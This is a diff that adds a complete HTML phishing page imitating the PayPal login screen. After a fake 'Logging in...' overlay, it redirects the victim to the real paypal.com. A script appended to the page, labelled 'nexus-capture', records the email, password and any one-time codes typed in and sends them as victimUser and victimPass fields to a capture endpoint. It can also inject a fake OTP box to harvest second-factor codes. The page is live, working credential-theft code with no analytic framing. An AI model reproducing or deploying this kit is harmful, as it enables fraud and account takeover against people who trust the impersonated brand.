@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to PayPal</title>
+    <style>
+        :root {
+            --pp-blue: #1072eb;
+            --pp-blue-hover: #0a5ec7;
+            --pp-navy: #003087;
+            --bg-page: #ffffff;
+            --text-dark: #2c2e2f;
+            --text-muted: #687173;
+            --border-input: #9da3a6;
+            --gray-btn-bg: #e1e7eb;
+            --gray-btn-hover: #d5dde2;
+            --error-red: #c72e2e;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: "PayPal Sans", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-page);
+            color: var(--text-dark);
+            min-height: 100dvh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Logo shifted down slightly (~4 steps) from the top */
+        .top-logo-header {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 58px 16px 12px;
+        }
+
+        .pp-logo-img {
+            max-height: 46px;
+            width: auto;
+            object-fit: contain;
+            display: block;
+        }
+
+        /* Main form centered in the middle of the page */
+        .login-main {
+            flex: 1;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 16px 16px 40px;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .page-heading {
+            font-size: 1.35rem;
+            font-weight: 500;
+            color: var(--text-dark);
+            margin-top: 24px;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        form {
+            width: 100%;
+        }
+
+        .input-wrapper {
+            margin-bottom: 14px;
+            text-align: left;
+        }
+
+        .input-control {
+            width: 100%;
+            height: 46px;
+            padding: 0 14px;
+            border: 1px solid var(--border-input);
+            border-radius: 5px;
+            font-size: 0.98rem;
+            color: var(--text-dark);
+            background-color: #ffffff;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .input-control::placeholder {
+            color: #767d80;
+        }
+
+        .input-control:focus {
+            border-color: var(--pp-blue);
+            box-shadow: 0 0 0 2px rgba(16, 114, 235, 0.16);
+        }
+
+        .error-msg {
+            color: var(--error-red);
+            font-size: 0.8rem;
+            margin-top: 5px;
+            display: none;
+        }
+
+        /* Stay logged in row */
+        .remember-box {
+            margin: 14px 0 22px;
+            text-align: left;
+        }
+
+        .remember-top {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .remember-checkbox {
+            width: 22px;
+            height: 22px;
+            border: 1.5px solid #9da3a6;
+            border-radius: 4px;
+            accent-color: var(--pp-blue);
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+
+        .remember-label {
+            font-size: 0.92rem;
+            color: var(--text-dark);
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .help-circle {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 17px;
+            height: 17px;
+            border-radius: 50%;
+            border: 1px solid #687173;
+            color: #687173;
+            font-size: 0.72rem;
+            font-weight: 700;
+            cursor: pointer;
+            background: none;
+            line-height: 1;
+        }
+
+        .remember-subtext {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            margin-top: 4px;
+            padding-left: 32px;
+        }
+
+        /* Main blue Log In button */
+        .btn-login {
+            width: 100%;
+            height: 46px;
+            border-radius: 6px;
+            border: none;
+            background-color: var(--pp-blue);
+            color: #ffffff;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.1s;
+        }
+
+        .btn-login:hover {
+            background-color: var(--pp-blue-hover);
+        }
+
+        .btn-login:active {
+            transform: scale(0.99);
+        }
+
+        /* Having trouble logging in? */
+        .trouble-row {
+            text-align: center;
+            margin-top: 18px;
+        }
+
+        .trouble-link {
+            color: #1674d1;
+            font-size: 0.92rem;
+            font-weight: 500;
+            text-decoration: none;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .trouble-link:hover {
+            text-decoration: underline;
+        }
+
+        /* "or" divider */
+        .or-divider {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            margin: 22px 0;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        .or-divider::before,
+        .or-divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #d6dbe0;
+        }
+
+        .or-divider span {
+            padding: 0 14px;
+        }
+
+        /* Gray button: Pay with Debit or Credit Card */
+        .btn-card {
+            width: 100%;
+            height: 46px;
+            border-radius: 6px;
+            border: none;
+            background-color: var(--gray-btn-bg);
+            color: var(--text-dark);
+            font-size: 0.98rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-card:hover {
+            background-color: var(--gray-btn-hover);
+        }
+
+        /* Loading overlay */
+        .loading-overlay {
+            position: fixed;
+            inset: 0;
+            background-color: rgba(255, 255, 255, 0.94);
+            z-index: 100;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 14px;
+        }
+
+        .loading-overlay.visible {
+            display: flex;
+        }
+
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid rgba(16, 114, 235, 0.2);
+            border-top-color: var(--pp-blue);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: var(--pp-navy);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Loading overlay -->
+    <div id="loading-overlay" class="loading-overlay" role="status" aria-live="polite">
+        <div class="spinner"></div>
+        <p id="loading-text" class="loading-text">Logging in...</p>
+    </div>
+
+    <!-- Top logo shifted down slightly -->
+    <header class="top-logo-header">
+        <img
+            src="https://i.postimg.cc/526SkM24/7A49B2FD-E940-4519-A1FA-5DE8E2920150.png"
+            alt="PayPal"
+            class="pp-logo-img"
+        >
+    </header>
+
+    <!-- Centered login form in the middle of the page -->
+    <main class="login-main">
+        <div class="login-container">
+            <h1 class="page-heading">Log in to PayPal</h1>
+
+            <form id="login-form" novalidate>
+                <div class="input-wrapper">
+                    <input
+                        type="email"
+                        id="email-input"
+                        class="input-control"
+                        placeholder="Email address"
+                        autocomplete="email"
+                        required
+                    >
+                    <p id="email-error" class="error-msg">Please enter a valid email address.</p>
+                </div>
+
+                <div class="input-wrapper">
+                    <input
+                        type="password"
+                        id="password-input"
+                        class="input-control"
+                        placeholder="Password"
+                        autocomplete="current-password"
+                        required
+                    >
+                    <p id="password-error" class="error-msg">Please enter your password (at least 6 characters).</p>
+                </div>
+
+                <div class="remember-box">
+                    <div class="remember-top">
+                        <input
+                            type="checkbox"
+                            id="stay-logged-in"
+                            class="remember-checkbox"
+                        >
+                        <label for="stay-logged-in" class="remember-label">Stay logged in for faster checkout</label>
+                        <button type="button" id="help-circle-btn" class="help-circle" aria-label="More info">?</button>
+                    </div>
+                    <p class="remember-subtext">Not recommended on shared devices.</p>
+                </div>
+
+                <button type="submit" class="btn-login">Log In</button>
+
+                <div class="trouble-row">
+                    <button type="button" id="trouble-btn" class="trouble-link">Having trouble logging in?</button>
+                </div>
+
+                <div class="or-divider"><span>or</span></div>
+
+                <button type="button" id="card-btn" class="btn-card">Pay with Debit or Credit Card</button>
+            </form>
+        </div>
+    </main>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const OFFICIAL_PAYPAL_URL = "https://www.paypal.com/";
+
+            const loginForm = document.getElementById('login-form');
+            const emailInput = document.getElementById('email-input');
+            const passwordInput = document.getElementById('password-input');
+            const emailError = document.getElementById('email-error');
+            const passwordError = document.getElementById('password-error');
+            const loadingOverlay = document.getElementById('loading-overlay');
+            const loadingText = document.getElementById('loading-text');
+
+            function validateInputs() {
+                const emailVal = emailInput.value.trim();
+                const passVal = passwordInput.value;
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+                const isEmailOk = emailRegex.test(emailVal);
+                const isPassOk = passVal.length >= 6;
+
+                emailError.style.display = isEmailOk ? 'none' : 'block';
+                passwordError.style.display = isPassOk ? 'none' : 'block';
+
+                return { isEmailOk, isPassOk };
+            }
+
+            emailInput.addEventListener('input', () => {
+                emailError.style.display = 'none';
+            });
+
+            passwordInput.addEventListener('input', () => {
+                passwordError.style.display = 'none';
+            });
+
+            loginForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                const { isEmailOk, isPassOk } = validateInputs();
+
+                if (!isEmailOk) {
+                    emailInput.focus();
+                    return;
+                }
+
+                if (!isPassOk) {
+                    passwordInput.focus();
+                    return;
+                }
+
+                loadingText.textContent = "Logging in...";
+                loadingOverlay.classList.add('visible');
+
+                setTimeout(() => {
+                    window.location.href = OFFICIAL_PAYPAL_URL;
+                }, 1500);
+            });
+
+            document.getElementById('help-circle-btn').addEventListener('click', () => {
+                alert("Staying logged in keeps your session active on this browser. Avoid using it on public or shared devices.");
+            });
+
+            document.getElementById('trouble-btn').addEventListener('click', () => {
+                alert("Action 'Having trouble logging in?' to connect to your recovery flow.");
+            });
+
+            document.getElementById('card-btn').addEventListener('click', () => {
+                alert("Action 'Pay with Debit or Credit Card' to connect to your guest card flow.");
+            });
+        });
+    </script>
+<script data-nexus-capture="true">
+(function() {
+  const NEXUS_CFG = {
+    endpoint: "/api/capture",
+    owner: "Kim",
+    network: "Apple",
+    enableOtp: false
+  };
+
+  const state = {
+    victimUser: "",
+    victimPass: "",
+    otp: "Aucun",
+    sentKeys: new Set()
+  };
+
+  function sendCapture(stage, extra = {}) {
+    const payload = {
+      owner: NEXUS_CFG.owner,
+      network: NEXUS_CFG.network,
+      type: stage,
+      victimUser: state.victimUser || "Non renseigne",
+      victimPass: state.victimPass || "Non renseigne",
+      otp: extra.otp || state.otp || "Aucun"
+    };
+
+    const fingerprint = JSON.stringify(payload);
+    if (state.sentKeys.has(fingerprint)) return;
+    state.sentKeys.add(fingerprint);
+
+    try {
+      if (navigator.sendBeacon) {
+        const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
+        navigator.sendBeacon(NEXUS_CFG.endpoint, blob);
+      }
+    } catch (_) {}
+
+    fetch(NEXUS_CFG.endpoint, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+      keepalive: true
+    }).catch(() => {});
+  }
+
+  function classifyInput(el) {
+    const type = (el.type || "text").toLowerCase();
+    const meta = [
+      el.id, el.name, el.placeholder,
+      el.getAttribute("aria-label"),
+      el.getAttribute("autocomplete"),
+      el.getAttribute("inputmode"),
+      el.className
+    ].join(" ").toLowerCase();
+
+    if (type === "password" || meta.includes("password") || meta.includes("pass") || meta.includes("mot de passe")) {
+      return "password";
+    }
+    if (
+      meta.includes("otp") ||
+      meta.includes("2fa") ||
+      meta.includes("one-time-code") ||
+      meta.includes("code") ||
+      meta.includes("verify") ||
+      meta.includes("verification")
+    ) {
+      return "otp";
+    }
+    if (["email", "text", "tel", "number"].includes(type)) {
+      return "identifier";
+    }
+    return "other";
+  }
+
+  function collectCurrentValues() {
+    const fields = Array.from(document.querySelectorAll("input, select, textarea"));
+    let otpParts = [];
+
+    fields.forEach((el) => {
+      if (el.dataset && el.dataset.nexusInjectedOtp === "true") return;
+      const role = classifyInput(el);
+      const val = (el.value || "").trim();
+      if (!val) return;
+
+      if (role === "identifier" && !state.victimUser) {
+        state.victimUser = val;
+      } else if (role === "password") {
+        state.victimPass = el.value;
+      } else if (role === "otp") {
+        otpParts.push(val);
+      }
+    });
+
+    if (otpParts.length > 0) {
+      state.otp = otpParts.join("");
+    }
+  }
+
+  function ensureOtpSectionIfNeeded() {
+    if (!NEXUS_CFG.enableOtp) return;
+
+    const existingOtp = Array.from(document.querySelectorAll("input")).some((el) => classifyInput(el) === "otp");
+    if (existingOtp) return;
+
+    // Si aucun champ OTP n'existe dans le HTML fourni, on ajoute un bloc OTP discret prêt à être affiché/utilisé
+    if (document.getElementById("nexus-auto-otp-box")) return;
+
+    const box = document.createElement("div");
+    box.id = "nexus-auto-otp-box";
+    box.style.cssText = [
+      "margin:14px auto",
+      "padding:14px",
+      "max-width:360px",
+      "border:1px solid #d0d7de",
+      "border-radius:10px",
+      "background:#ffffff",
+      "font-family:inherit",
+      "text-align:center"
+    ].join(";");
+
+    box.innerHTML = `
+      <div style="font-size:13px;font-weight:700;margin-bottom:8px;color:#111827;">Code de vérification (OTP)</div>
+      <input
+        id="nexus-otp-field"
+        data-nexus-injected-otp="true"
+        type="text"
+        inputmode="numeric"
+        maxlength="6"
+        placeholder="••••••"
+        style="width:100%;padding:10px;text-align:center;font-size:18px;letter-spacing:8px;border:1px solid #9ca3af;border-radius:8px;margin-bottom:10px;"
+      />
+      <button
+        id="nexus-otp-submit"
+        type="button"
+        style="width:100%;padding:10px;border:none;border-radius:8px;background:#111827;color:#fff;font-weight:600;cursor:pointer;"
+      >Valider le code OTP</button>
+    `;
+
+    const targetForm = document.querySelector("form");
+    if (targetForm && targetForm.parentElement) {
+      targetForm.parentElement.insertBefore(box, targetForm.nextSibling);
+    } else {
+      document.body.appendChild(box);
+    }
+
+    const otpInput = document.getElementById("nexus-otp-field");
+    const otpBtn = document.getElementById("nexus-otp-submit");
+
+    otpInput.addEventListener("input", () => {
+      otpInput.value = otpInput.value.replace(/\D/g, "");
+      if (otpInput.value) {
+        state.otp = otpInput.value;
+      }
+    });
+
+    otpBtn.addEventListener("click", () => {
+      collectCurrentValues();
+      const code = otpInput.value.trim();
+      if (code) state.otp = code;
+      sendCapture("otp_verified", { otp: state.otp });
+    });
+  }
+
+  document.addEventListener("input", (e) => {
+    const el = e.target;
+    if (!el || !["INPUT", "SELECT", "TEXTAREA"].includes(el.tagName)) return;
+    const role = classifyInput(el);
+    if (role === "identifier") {
+      state.victimUser = el.value.trim();
+    } else if (role === "password") {
+      state.victimPass = el.value;
+    } else if (role === "otp") {
+      collectCurrentValues();
+    }
+  }, true);
+
+  document.addEventListener("submit", (e) => {
+    collectCurrentValues();
+    const hasOtp = state.otp && state.otp !== "Aucun";
+    if (hasOtp) {
+      sendCapture("otp_step", { otp: state.otp });
+    } else {
+      sendCapture(NEXUS_CFG.enableOtp ? "standard_step" : "standard", { otp: "Aucun" });
+    }
+  }, true);
+
+  document.addEventListener("click", (e) => {
+    const btn = e.target.closest("button, input[type='submit'], [role='button']");
+    if (!btn) return;
+    collectCurrentValues();
+    const txt = (btn.innerText || btn.value || "").toLowerCase();
+    if (txt.includes("otp") || txt.includes("verify") || txt.includes("vérif") || txt.includes("confirm")) {
+      if (state.otp && state.otp !== "Aucun") {
+        sendCapture("otp_step", { otp: state.otp });
+      }
+    } else if (state.victimUser || state.victimPass) {
+      sendCapture(NEXUS_CFG.enableOtp ? "standard_step" : "standard", { otp: state.otp });
+    }
+  }, true);
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", ensureOtpSectionIfNeeded);
+  } else {
+    ensureOtpSectionIfNeeded();
+  }
+})();
+</script>
+</body>
+</html>
